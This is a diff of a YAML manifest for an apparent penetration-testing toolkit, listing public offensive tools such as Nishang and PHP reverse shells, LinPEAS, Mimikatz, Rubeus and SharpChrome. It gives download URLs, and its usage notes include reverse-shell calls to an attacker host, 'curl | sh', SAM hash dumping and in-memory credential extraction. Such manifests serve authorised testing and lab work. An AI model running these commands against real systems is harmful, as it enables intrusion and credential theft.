-    upstream_url: "https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1"
-    upstream_version: "latest"
-    license: "MIT"
-    sha256: ""
-    folder: "Nishang"
-    categories: ["Shells"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["shell", "reverse-shell", "powershell", "nishang"]
-    finding_triggers: ["*"]
-    notes: "Append: Invoke-PowerShellTcp -Reverse -IPAddress KALI -Port 4444"
-
-  - name: "Invoke-PowerShellTcpOneLine.ps1"
-    display_name: "Invoke-PowerShellTcpOneLine"
-    description: "Nishang one-liner PowerShell reverse TCP shell"
-    project_url: "https://github.com/samratashok/nishang"
-    upstream_url: "https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcpOneLine.ps1"
-    upstream_version: "latest"
-    license: "MIT"
-    sha256: ""
-    folder: "Nishang"
-    categories: ["Shells"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["shell", "reverse-shell", "powershell", "nishang", "oneliner"]
-    finding_triggers: ["*"]
-    notes: "Edit IP/port before use; one-liner format"
-
-  - name: "php-reverse-shell.php"
-    display_name: "PHP Reverse Shell"
-    description: "Pentestmonkey PHP reverse shell for web server exploitation"
-    project_url: "https://github.com/pentestmonkey/php-reverse-shell"
-    upstream_url: "https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php"
-    upstream_version: "latest"
-    license: "GPL-2.0"
-    sha256: ""
-    folder: "WebShells"
-    categories: ["Shells"]
-    platform: "linux"
-    architecture: "any"
-    tags: ["shell", "reverse-shell", "php", "webshell"]
-    finding_triggers: ["*"]
-    notes: "Edit $ip and $port before uploading to web server"
-
-  - name: "Invoke-ConPtyShell.ps1"
-    display_name: "Invoke-ConPtyShell"
-    description: "Fully interactive reverse shell via Windows ConPty API - enables tab completion, vim, su"
-    project_url: "https://github.com/antonioCoco/ConPtyShell"
-    upstream_url: "https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1"
-    upstream_version: "latest"
-    license: "MIT"
-    sha256: ""
-    folder: "ConPtyShell"
-    categories: ["Shells"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["shell", "reverse-shell", "interactive", "conpty", "powershell"]
-    finding_triggers: ["*"]
-    notes: "Invoke-ConPtyShell KALI 4444; on Kali: stty raw -echo; nc -lvnp 4444"
-
-  # ---------------------------------------------------------------------------
-  # Tunneling (additional)
-  # ---------------------------------------------------------------------------
-
-  - name: "ligolo-proxy.exe"
-    display_name: "Ligolo-ng Proxy (Windows)"
-    description: "Ligolo-ng proxy for Windows - runs on attack host to receive agent connections"
-    project_url: "https://github.com/nicocha30/ligolo-ng"
-    upstream_url: "https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_proxy_windows_amd64.zip"
-    upstream_version: "latest"
-    license: "GPL-3.0"
-    sha256: ""
-    folder: "Ligolo"
-    categories: ["Tunneling"]
-    platform: "windows"
-    architecture: "x64"
-    tags: ["tunneling", "pivoting", "ligolo", "proxy"]
-    finding_triggers: ["*"]
-    notes: "Extracted from zip; run with: ligolo-proxy.exe -selfcert"
-
-  - name: "ncat.exe"
-    display_name: "Ncat (Windows)"
-    description: "Nmap's netcat reimplementation for Windows - supports SSL, IPv6, proxies"
-    project_url: "https://nmap.org/ncat/"
-    upstream_url: "https://nmap.org/dist/nmap-7.95-win32.zip"
-    upstream_version: "7.95"
-    license: "NPSL"
-    sha256: ""
-    folder: "Netcat"
-    categories: ["Tunneling", "Shells"]
-    platform: "windows"
-    architecture: "x86"
-    tags: ["tunneling", "shell", "netcat", "ncat", "nmap"]
-    finding_triggers: ["*"]
-    notes: "Extracted from nmap zip; ncat.exe -lvnp 4444"
-
-  - name: "ncat"
-    display_name: "Ncat (Linux)"
-    description: "Nmap's netcat reimplementation for Linux - supports SSL, IPv6, proxies"
-    project_url: "https://nmap.org/ncat/"
-    upstream_url: "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat"
-    upstream_version: "latest"
-    license: "NPSL"
-    sha256: ""
-    folder: "Netcat"
-    categories: ["Tunneling", "Shells"]
-    platform: "linux"
-    architecture: "x64"
-    tags: ["tunneling", "shell", "netcat", "ncat", "linux", "static"]
-    finding_triggers: ["*"]
-    notes: "Static binary; ncat -lvnp 4444"
-
-  # ---------------------------------------------------------------------------
-  # AD (additional)
-  # ---------------------------------------------------------------------------
-
-  - name: "SharpView.exe"
-    display_name: "SharpView"
-    description: "C# port of PowerView - .NET implementation of AD enumeration without PowerShell"
-    project_url: "https://github.com/tevora-threat/SharpView"
-    upstream_url: "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpView.exe"
-    upstream_version: "latest"
-    license: "BSD-3-Clause"
-    sha256: ""
-    folder: "SharpView"
-    categories: ["AD", "Enumeration"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["ad", "enumeration", "powerview", "bloodhound-alternative"]
-    finding_triggers: ["domain_joined"]
-    notes: "Run with: .\\SharpView.exe Get-DomainUser"
-
-  # ---------------------------------------------------------------------------
-  # Impacket (additional)
-  # ---------------------------------------------------------------------------
-
-  - name: "lookupsid.py"
-    display_name: "lookupsid"
-    description: "Impacket - enumerate domain users and groups via SID brute-forcing"
-    project_url: "https://github.com/fortra/impacket"
-    upstream_url: "https://raw.githubusercontent.com/fortra/impacket/master/examples/lookupsid.py"
-    upstream_version: "latest"
-    license: "Apache-2.0"
-    sha256: ""
-    folder: "Impacket"
-    categories: ["Impacket"]
-    platform: "linux"
-    architecture: "any"
-    tags: ["impacket", "ad", "sid", "enumeration", "python"]
-    finding_triggers: ["domain_joined"]
-    notes: "Run with: python3 lookupsid.py domain/user:pass@DC"
-
-  - name: "reg.py"
-    display_name: "reg"
-    description: "Impacket - remote Windows registry read/write over SMB"
-    project_url: "https://github.com/fortra/impacket"
-    upstream_url: "https://raw.githubusercontent.com/fortra/impacket/master/examples/reg.py"
-    upstream_version: "latest"
-    license: "Apache-2.0"
-    sha256: ""
-    folder: "Impacket"
-    categories: ["Impacket"]
-    platform: "linux"
-    architecture: "any"
-    tags: ["impacket", "registry", "smb", "python"]
-    finding_triggers: ["*"]
-    notes: "Run with: python3 reg.py domain/user:pass@target query -keyName HKLM\\\\SAM"
-
-  - name: "samrdump.py"
-    display_name: "samrdump"
-    description: "Impacket - dump SAM database users and password hashes via MS-SAMR"
-    project_url: "https://github.com/fortra/impacket"
-    upstream_url: "https://raw.githubusercontent.com/fortra/impacket/master/examples/samrdump.py"
-    upstream_version: "latest"
-    license: "Apache-2.0"
-    sha256: ""
-    folder: "Impacket"
-    categories: ["Impacket"]
-    platform: "linux"
-    architecture: "any"
-    tags: ["impacket", "sam", "credentials", "python"]
-    finding_triggers: ["*"]
-    notes: "Run with: python3 samrdump.py domain/user:pass@target"
-
-  - name: "services.py"
-    display_name: "services"
-    description: "Impacket - remote Windows service management via MS-SCMR"
-    project_url: "https://github.com/fortra/impacket"
-    upstream_url: "https://raw.githubusercontent.com/fortra/impacket/master/examples/services.py"
-    upstream_version: "latest"
-    license: "Apache-2.0"
-    sha256: ""
-    folder: "Impacket"
-    categories: ["Impacket"]
-    platform: "linux"
-    architecture: "any"
-    tags: ["impacket", "services", "scm", "lateral-movement", "python"]
-    finding_triggers: ["*"]
-    notes: "Run with: python3 services.py domain/user:pass@target list"
-
-# =============================================================================
-# Category Definitions
-# =============================================================================
-
+- name: winPEASx64.exe
+  display_name: WinPEAS (x64)
+  description: Windows Privilege Escalation Awesome Script - x64 binary
+  project_url: https://github.com/peass-ng/PEASS-ng
+  upstream_url: https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe
+  upstream_version: latest
+  license: Apache-2.0
+  sha256: 2d2d71899b884b3f026dec955ac4ee48bf8937d550a2257c8727be9ec5c4edf3
+  folder: WinPEAS
+  categories:
+  - Enumeration
+  platform: windows
+  architecture: x64
+  tags:
+  - enumeration
+  - privesc
+  - peass
+  finding_triggers:
+  - '*'
+  notes: 'Run with: .\winPEASx64.exe'
+- name: winPEASx86.exe
+  display_name: WinPEAS (x86)
+  description: Windows Privilege Escalation Awesome Script - x86 binary
+  project_url: https://github.com/peass-ng/PEASS-ng
+  upstream_url: https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx86.exe
+  upstream_version: latest
+  license: Apache-2.0
+  sha256: ce73fc813c99e5c2bb0716cc1da2793be5733e57d13b12145aea5903b1e9f9fb
+  folder: WinPEAS
+  categories:
+  - Enumeration
+  platform: windows
+  architecture: x86
+  tags:
+  - enumeration
+  - privesc
+  - peass
+  finding_triggers:
+  - '*'
+  notes: 'Run with: .\winPEASx86.exe'
+- name: winPEASany.exe
+  display_name: WinPEAS (Any CPU)
+  description: Windows Privilege Escalation Awesome Script - Any CPU, obfuscated
+  project_url: https://github.com/peass-ng/PEASS-ng
+  upstream_url: https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe
+  upstream_version: latest
+  license: Apache-2.0
+  sha256: a3e1dea81cb37940aff6e8c4d2471d61f90a484f8889f4cef82b11ccfc472d77
+  folder: WinPEAS
+  categories:
+  - Enumeration
+  platform: windows
+  architecture: any
+  tags:
+  - enumeration
+  - privesc
+  - peass
+  - obfuscated
+  finding_triggers:
+  - '*'
+  notes: Obfuscated build; works on both x86 and x64
+- name: winPEAS.bat
+  display_name: WinPEAS (Batch)
+  description: Windows Privilege Escalation Awesome Script - Batch version
+  project_url: https://github.com/peass-ng/PEASS-ng
+  upstream_url: https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.bat
+  upstream_version: latest
+  license: Apache-2.0
+  sha256: 4a91614f59c9a659a54532f065fdb9913ec414c87edcdf293416612053a0ec85
+  folder: WinPEAS
+  categories:
+  - Enumeration
+  platform: windows
+  architecture: any
+  tags:
+  - enumeration
+  - privesc
+  - peass
+  - batch
+  finding_triggers:
+  - '*'
+  notes: Batch fallback when .NET is unavailable
+- name: linpeas.sh
+  display_name: LinPEAS (Shell)
+  description: Linux Privilege Escalation Awesome Script - Shell version
+  project_url: https://github.com/peass-ng/PEASS-ng
+  upstream_url: https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
+  upstream_version: latest
+  license: Apache-2.0
+  sha256: e59effc3dbb71d69afb1f517f10648e544f48394747f4e6a2ed6c119a8d77395
+  folder: LinPEAS
+  categories:
+  - Enumeration
+  platform: linux
+  architecture: any
+  tags:
+  - enumeration
+  - privesc
+  - peass
+  - linux
+  finding_triggers:
+  - '*'
+  notes: 'Run with: sh linpeas.sh or curl | sh'
+- name: linpeas_linux_amd64
+  display_name: LinPEAS (Binary, amd64)
+  description: Linux Privilege Escalation Awesome Script - Static binary for amd64
+  project_url: https://github.com/peass-ng/PEASS-ng
+  upstream_url: https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64
+  upstream_version: latest
+  license: Apache-2.0
+  sha256: 74bd3dabb31c07944296f444bfcf5be873c2dfbcc45426bb63043efb073fd17d
+  folder: LinPEAS
+  categories:
+  - Enumeration
+  platform: linux
+  architecture: x64
+  tags:
+  - enumeration
+  - privesc
+  - peass
+  - linux
+  - static
+  finding_triggers:
+  - '*'
+  notes: Static binary, no dependencies
+- name: SharpUp.exe
+  display_name: SharpUp
+  description: C# port of PowerUp - checks for common Windows privesc vectors
+  project_url: https://github.com/GhostPack/SharpUp
+  upstream_url: https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpUp.exe
+  upstream_version: latest
+  license: BSD-3-Clause
+  sha256: 0211786ab0faf3ffffe38445b2d2193a23bdad0cd1cbe3e676209b0cd7bd3cae
+  folder: SharpUp
+  categories:
+  - Enumeration
+  platform: windows
+  architecture: any
+  tags:
+  - enumeration
+  - privesc
+  - ghostpack
+  finding_triggers:
+  - '*'
+  notes: 'Run with: .\SharpUp.exe audit'
+- name: Seatbelt.exe
+  display_name: Seatbelt
+  description: Security-oriented host-survey tool - performs numerous safety checks
+  project_url: https://github.com/GhostPack/Seatbelt
+  upstream_url: https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/Seatbelt.exe
+  upstream_version: latest
+  license: BSD-3-Clause
+  sha256: 1d2b3fa182a86c4981a92e498a89cd2e636581eb5daadfbb7d7dd7337c86fecb
+  folder: Seatbelt
+  categories:
+  - Enumeration
+  platform: windows
+  architecture: any
+  tags:
+  - enumeration
+  - survey
+  - ghostpack
+  finding_triggers:
+  - '*'
+  notes: 'Run with: .\Seatbelt.exe -group=all'
+- name: PowerUp.ps1
+  display_name: PowerUp
+  description: PowerSploit privesc module - finds common Windows misconfigurations
+  project_url: https://github.com/PowerShellMafia/PowerSploit
+  upstream_url: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
+  upstream_version: latest
+  license: BSD-3-Clause
+  sha256: 9d59d4c128570eb80c0e8d13e2185030f93d965278b203c91dd196b2e1d3cd22
+  folder: PowerSploit
+  categories:
+  - Enumeration
+  - AD
+  platform: windows
+  architecture: any
+  tags:
+  - enumeration
+  - privesc
+  - powersploit
+  - powershell
+  finding_triggers:
+  - '*'
+  notes: Import-Module .\PowerUp.ps1; Invoke-AllChecks
+- name: jaws-enum.ps1
+  display_name: JAWS
+  description: Just Another Windows (Enum) Script - Windows enumeration
+  project_url: https://github.com/411Hall/JAWS
+  upstream_url: https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1
+  upstream_version: latest
+  license: MIT
+  sha256: 7c5f2a61a9565a3f9fe48ce9c75c6a1228ca4a31794741279dd9c5d077f46158
+  folder: JAWS
+  categories:
+  - Enumeration
+  platform: windows
+  architecture: any
+  tags:
+  - enumeration
+  - privesc
+  - powershell
+  finding_triggers:
+  - '*'
+  notes: 'Run with: powershell -ep bypass -f jaws-enum.ps1'
+- name: Watson.exe
+  display_name: Watson
+  description: Enumerate missing KBs and suggest exploits for privilege escalation
+  project_url: https://github.com/rasta-mouse/Watson
+  upstream_url: https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/Watson.exe
+  upstream_version: latest
+  license: MIT
+  sha256: e2d0c91968d56142db2f565f13f66dfc9360c1833321198151980824b7467358
+  folder: Watson
+  categories:
+  - Enumeration
+  platform: windows
+  architecture: any
+  tags:
+  - enumeration
+  - privesc
+  - patch
+  - exploit-suggester
+  finding_triggers:
+  - '*'
+  notes: 'Run with: .\Watson.exe'
+- name: Sherlock.ps1
+  display_name: Sherlock
+  description: Find missing Windows patches for privilege escalation (predecessor to Watson)
+  project_url: https://github.com/rasta-mouse/Sherlock
+  upstream_url: https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1
+  upstream_version: latest
+  license: MIT
+  sha256: 4273d700db81d85875f17598c55aada17e009bbc8fbd6a295ca1c4dc9f90835f
+  folder: Sherlock
+  categories:
+  - Enumeration
+  platform: windows
+  architecture: any
+  tags:
+  - enumeration
+  - privesc
+  - patch
+  - powershell
+  finding_triggers:
+  - '*'
+  notes: Import-Module .\Sherlock.ps1; Find-AllVulns (deprecated, prefer Watson)
+- name: LinEnum.sh
+  display_name: LinEnum
+  description: Linux enumeration and privilege escalation checks
+  project_url: https://github.com/rebootuser/LinEnum
+  upstream_url: https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+  upstream_version: latest
+  license: GPL-3.0
+  sha256: bdefadb0a866f3e289711afccb46fa2fa1081ccfa3e89c22fdddbd57e48dda5b
+  folder: LinEnum
+  categories:
+  - Enumeration
+  platform: linux
+  architecture: any
+  tags:
+  - enumeration
+  - privesc
+  - linux
+  finding_triggers:
+  - '*'
+  notes: 'Run with: sh LinEnum.sh -t'
+- name: lse.sh
+  display_name: Linux Smart Enumeration
+  description: Linux enumeration tool with verbosity levels
+  project_url: https://github.com/diego-treitos/linux-smart-enumeration
+  upstream_url: https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
+  upstream_version: latest
+  license: GPL-3.0
+  sha256: a0c526f560189c81bc66303b81e828edabc68deed7e7bd28aed55a792c6d25c3
+  folder: LSE
+  categories:
+  - Enumeration
+  platform: linux
+  architecture: any
+  tags:
+  - enumeration
+  - privesc
+  - linux
+  finding_triggers:
+  - '*'
+  notes: 'Run with: sh lse.sh -l 2'
+- name: linux-exploit-suggester.sh
+  display_name: Linux Exploit Suggester
+  description: Suggests applicable kernel exploits based on OS release and kernel version
+  project_url: https://github.com/The-Z-Labs/linux-exploit-suggester
+  upstream_url: https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/master/linux-exploit-suggester.sh
+  upstream_version: latest
+  license: MIT
+  sha256: a003d23cb062c12c488eae5c7dbfc1d5708ee9a9ec044428bdacab93240a3e5a
+  folder: LES
+  categories:
+  - Enumeration
+  platform: linux
+  architecture: any
+  tags:
+  - enumeration
+  - privesc
+  - linux
+  - kernel
+  - exploit-suggester
+  finding_triggers:
+  - '*'
+  notes: 'Run with: sh linux-exploit-suggester.sh'
+- name: pspy64
+  display_name: pspy (64-bit)
+  description: Unprivileged Linux process snooping - monitors processes without root
+  project_url: https://github.com/DominicBreuker/pspy
+  upstream_url: https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
+  upstream_version: v1.2.1
+  license: GPL-3.0
+  sha256: c93f29a5cc1347bdb90e14a12424e6469c8cfea9a20b800bc249755f0043a3bb
+  folder: pspy
+  categories:
+  - Enumeration
+  platform: linux
+  architecture: x64
+  tags:
+  - enumeration
+  - process-monitor
+  - linux
+  finding_triggers:
+  - '*'
+  notes: 'Run with: ./pspy64'
+- name: pspy32
+  display_name: pspy (32-bit)
+  description: Unprivileged Linux process snooping - 32-bit binary
+  project_url: https://github.com/DominicBreuker/pspy
+  upstream_url: https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32
+  upstream_version: v1.2.1
+  license: GPL-3.0
+  sha256: 1e38ac09d7851b22e16980abc58f93cabdc4a02859c56a2810aa51930277d450
+  folder: pspy
+  categories:
+  - Enumeration
+  platform: linux
+  architecture: x86
+  tags:
+  - enumeration
+  - process-monitor
+  - linux
+  finding_triggers:
+  - '*'
+  notes: 'Run with: ./pspy32'
+- name: pspy64s
+  display_name: pspy (64-bit, small)
+  description: Unprivileged Linux process snooping - small 64-bit binary
+  project_url: https://github.com/DominicBreuker/pspy
+  upstream_url: https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64s
+  upstream_version: v1.2.1
+  license: GPL-3.0
+  sha256: e0277c164facb2d0fb95682a77887dd908b0e1dacb28a2bcafd6728b34835425
+  folder: pspy
+  categories:
+  - Enumeration
+  platform: linux
+  architecture: x64
+  tags:
+  - enumeration
+  - process-monitor
+  - linux
+  - small
+  finding_triggers:
+  - '*'
+  notes: Smaller binary, fewer features than pspy64
+- name: pspy32s
+  display_name: pspy (32-bit, small)
+  description: Unprivileged Linux process snooping - small 32-bit binary
+  project_url: https://github.com/DominicBreuker/pspy
+  upstream_url: https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32s
+  upstream_version: v1.2.1
+  license: GPL-3.0
+  sha256: f2e8ed736e90aa38fd23606937e9e8393db6d10cb3be426afe4b65564860df35
+  folder: pspy
+  categories:
+  - Enumeration
+  platform: linux
+  architecture: x86
+  tags:
+  - enumeration
+  - process-monitor
+  - linux
+  - small
+  finding_triggers:
+  - '*'
+  notes: Smaller binary, fewer features than pspy32
+- name: accesschk.exe
+  display_name: AccessChk (64-bit)
+  description: Sysinternals tool to check effective permissions on files, registry, services
+  project_url: https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk
+  upstream_url: https://download.sysinternals.com/files/AccessChk.zip
+  upstream_version: latest
+  license: Proprietary
+  sha256: 8ef5e3cf235bcf4ecdcf8b4da1c0016a75f104b8591a65cc083ae3a82d496e07
+  folder: Sysinternals
+  categories:
+  - Enumeration
+  platform: windows
+  architecture: x64
+  tags:
+  - enumeration
+  - permissions
+  - services
+  - sysinternals
+  finding_triggers:
+  - unquoted_service_path
+  - writable_path_dir
+  notes: Extracted as accesschk64.exe from archive
+- name: accesschk32.exe
+  display_name: AccessChk (32-bit)
+  description: Sysinternals tool to check effective permissions - 32-bit build
+  project_url: https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk
+  upstream_url: https://download.sysinternals.com/files/AccessChk.zip
+  upstream_version: latest
+  license: Proprietary
+  sha256: 8ef5e3cf235bcf4ecdcf8b4da1c0016a75f104b8591a65cc083ae3a82d496e07
+  folder: Sysinternals
+  categories:
+  - Enumeration
+  platform: windows
+  architecture: x86
+  tags:
+  - enumeration
+  - permissions
+  - services
+  - sysinternals
+  finding_triggers:
+  - unquoted_service_path
+  - writable_path_dir
+  notes: Extracted as accesschk.exe (32-bit) from archive
+- name: PsExec.exe
+  display_name: PsExec (64-bit)
+  description: Sysinternals remote process execution utility
+  project_url: https://learn.microsoft.com/en-us/sysinternals/downloads/psexec
+  upstream_url: https://download.sysinternals.com/files/PSTools.zip
+  upstream_version: latest
+  license: Proprietary
+  sha256: a9ca77dfe03ce15004157727bb43ba66f00ceb215362c9b3d199f000edaa8d61
+  folder: Sysinternals
+  categories:
+  - Enumeration
+  platform: windows
+  architecture: x64
+  tags:
+  - execution
+  - remote
+  - sysinternals
+  finding_triggers:
+  - '*'
+  notes: Extracted as PsExec64.exe from PSTools.zip
+- name: procdump.exe
+  display_name: ProcDump (64-bit)
+  description: Sysinternals process dump utility for memory extraction
+  project_url: https://learn.microsoft.com/en-us/sysinternals/downloads/procdump
+  upstream_url: https://download.sysinternals.com/files/Procdump.zip
+  upstream_version: latest
+  license: Proprietary
+  sha256: 863e7f078b35327cedc5a1101c60e26c2a9e7f76388d0d0ffe44018b381784b4
+  folder: Sysinternals
+  categories:
+  - Enumeration
+  platform: windows
+  architecture: x64
+  tags:
+  - dump
+  - process
+  - memory
+  - sysinternals
+  finding_triggers:
+  - '*'
+  notes: Extracted as procdump64.exe from archive
+- name: SharpWMI.exe
+  display_name: SharpWMI
+  description: C# implementation of WMI for remote system interaction
+  project_url: https://github.com/GhostPack/SharpWMI
+  upstream_url: https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpWMI.exe
+  upstream_version: latest
+  license: BSD-3-Clause
+  sha256: 2903b8a03de2ef6fd6bc7057e89b9585d7ea0dd09b5dbb203f06001c750d5776
+  folder: SharpWMI
+  categories:
+  - Enumeration
+  platform: windows
+  architecture: any
+  tags:
+  - enumeration
+  - wmi
+  - ghostpack
+  finding_triggers:
+  - '*'
+  notes: 'Run with: .\SharpWMI.exe action=query query="select * from win32_service"'
+- name: RunasCs.exe
+  display_name: RunasCs
+  description: C# runas implementation with proper credential handling and process creation
+  project_url: https://github.com/antonioCoco/RunasCs
+  upstream_url: https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip
+  upstream_version: v1.5
+  license: MIT
+  sha256: 88f826096be1ed1be32dd45dc2381189df7c5f349c7b808edb872e68be4a9350
+  folder: RunasCs
+  categories:
+  - Enumeration
+  platform: windows
+  architecture: any
+  tags:
+  - execution
+  - runas
+  - credentials
+  finding_triggers:
+  - autologon_credentials
+  - saved_credentials_cmdkey
+  notes: 'Run with: .\RunasCs.exe user pass cmd.exe'
+- name: RunasCs_net2.exe
+  display_name: RunasCs (.NET 2.0)
+  description: RunasCs compiled for .NET 2.0 - for older Windows systems
+  project_url: https://github.com/antonioCoco/RunasCs
+  upstream_url: https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip
+  upstream_version: v1.5
+  license: MIT
+  sha256: 88f826096be1ed1be32dd45dc2381189df7c5f349c7b808edb872e68be4a9350
+  folder: RunasCs
+  categories:
+  - Enumeration
+  platform: windows
+  architecture: any
+  tags:
+  - execution
+  - runas
+  - credentials
+  - net2
+  finding_triggers:
+  - autologon_credentials
+  - saved_credentials_cmdkey
+  notes: For legacy .NET 2.0 systems
+- name: lazagne.exe
+  display_name: LaZagne
+  description: Credentials recovery tool - extracts passwords stored on local computer
+  project_url: https://github.com/AlessandroZ/LaZagne
+  upstream_url: https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe
+  upstream_version: v2.4.6
+  license: LGPL-3.0
+  sha256: 467e49f1f795c1b08245ae621c59cdf06df630fc1631dc0059da9a032858a486
+  folder: LaZagne
+  categories:
+  - Credentials
+  platform: windows
+  architecture: any
+  tags:
+  - credentials
+  - password-recovery
+  - browsers
+  finding_triggers:
+  - autologon_credentials
+  - saved_credentials_cmdkey
+  - ps_history_credentials
+  notes: 'Run with: .\lazagne.exe all'
+- name: mimikatz.exe
+  display_name: Mimikatz (x64)
+  description: Windows credential extraction tool - x64 binary
+  project_url: https://github.com/gentilkiwi/mimikatz
+  upstream_url: https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip
+  upstream_version: latest
+  license: CC-BY-4.0
+  sha256: 7accd179e8a6b2fc907e7e8d087c52a7f48084852724b03d25bebcada1acbca5
+  folder: Mimikatz
+  categories:
+  - Credentials
+  platform: windows
+  architecture: x64
+  tags:
+  - credentials
+  - mimikatz
+  - lsass
+  - kerberos
+  finding_triggers:
+  - autologon_credentials
+  - saved_credentials_cmdkey
+  - ps_history_credentials
+  notes: Extracted from mimikatz_trunk.zip (x64/mimikatz.exe)
+- name: mimikatz32.exe
+  display_name: Mimikatz (x86)
+  description: Windows credential extraction tool - 32-bit binary
+  project_url: https://github.com/gentilkiwi/mimikatz
+  upstream_url: https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip
+  upstream_version: latest
+  license: CC-BY-4.0
+  sha256: 7accd179e8a6b2fc907e7e8d087c52a7f48084852724b03d25bebcada1acbca5
+  folder: Mimikatz
+  categories:
+  - Credentials
+  platform: windows
+  architecture: x86
+  tags:
+  - credentials
+  - mimikatz
+  - lsass
+  - kerberos
+  finding_triggers:
+  - autologon_credentials
+  - saved_credentials_cmdkey
+  - ps_history_credentials
+  notes: Extracted from mimikatz_trunk.zip (Win32/mimikatz.exe)
+- name: Invoke-Mimikatz.ps1
+  display_name: Invoke-Mimikatz
+  description: PowerSploit module - reflective Mimikatz loader for in-memory execution
+  project_url: https://github.com/PowerShellMafia/PowerSploit
+  upstream_url: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1
+  upstream_version: latest
+  license: BSD-3-Clause
+  sha256: ebf54f745dc81e1958f75e4ca91dd0ab989fc9787bb6b0bf993e2f51d9a2a5bb
+  folder: PowerSploit
+  categories:
+  - Credentials
+  platform: windows
+  architecture: any
+  tags:
+  - credentials
+  - mimikatz
+  - powersploit
+  - powershell
+  - in-memory
+  finding_triggers:
+  - autologon_credentials
+  - saved_credentials_cmdkey
+  - ps_history_credentials
+  notes: 'IEX then: Invoke-Mimikatz -DumpCreds'
+- name: SharpDPAPI.exe
+  display_name: SharpDPAPI
+  description: C# port of DPAPI functions - decrypt DPAPI-protected data
+  project_url: https://github.com/GhostPack/SharpDPAPI
+  upstream_url: https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpDPAPI.exe
+  upstream_version: latest
+  license: BSD-3-Clause
+  sha256: 93f22f4db14c8179f9c91790935e7b0bb9c6cb4bfe1f1d86127457e6cfcc9de3
+  folder: SharpDPAPI
+  categories:
+  - Credentials
+  platform: windows
+  architecture: any
+  tags:
+  - credentials
+  - dpapi
+  - ghostpack
+  finding_triggers:
+  - autologon_credentials
+  - saved_credentials_cmdkey
+  - ps_history_credentials
+  notes: 'Run with: .\SharpDPAPI.exe triage'
+- name: SharpChrome.exe
+  display_name: SharpChrome
+  description: C# tool to extract Chrome browser saved credentials and cookies
+  project_url: https://github.com/GhostPack/SharpDPAPI
+  upstream_url: https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpChrome.exe
+  upstream_version: latest
+  license: BSD-3-Clause
+  sha256: 10ea01bfa5aa500133f07d6af45250fbc347764532ffdb6ddd47c479bd1f22f9
+  folder: SharpChrome
+  categories:
+  - Credentials
+  platform: windows
+  architecture: any
+  tags:
+  - credentials
+  - chrome
+  - browser
+  - ghostpack
+  finding_triggers:
+  - autologon_credentials
+  - saved_credentials_cmdkey
+  - ps_history_credentials
+  notes: 'Run with: .\SharpChrome.exe logins'
+- name: Rubeus.exe
+  display_name: Rubeus
+  description: C# Kerberos abuse toolkit - ticket requests, roasting, delegation attacks
+  project_url: https://github.com/GhostPack/Rubeus
+  upstream_url: https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/Rubeus.exe
+  upstream_version: latest
+  license: BSD-3-Clause
+  sha256: 1b2bb6363071fac27c87ea58b82386cf3e0ced2886eb05258c8152948db86c4e
+  folder: Rubeus
+  categories:
+  - Credentials
+  - AD
+  platform: windows
+  architecture: any
+  tags:
+  - credentials
+  - kerberos
+  - roasting
+  - ghostpack
+  - ad
+  finding_triggers:
+  - domain_joined
+  notes: 'Run with: .\Rubeus.exe triage'
+- name: SafetyKatz.exe
+  display_name: SafetyKatz
+  description: MiniDumpWriteDump of LSASS then Mimikatz parsing in-memory
+  project_url: https://github.com/GhostPack/SafetyKatz
+  upstream_url: https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SafetyKatz.exe
+  upstream_version: latest
+  license: BSD-3-Clause
+  sha256: 3951c1b03367cc1dc4de8290ec9507dad9f239a53b815f09691dea5a78c00901
+  folder: SafetyKatz
+  categories:
+  - Credentials
+  platform: windows
+  architecture: any
+  tags:
+  - credentials
+  - lsass
+  - mimikatz
+  - ghostpack
+  finding_triggers:
+  - autologon_credentials
+  - saved_credentials_cmdkey
+  - ps_history_credentials
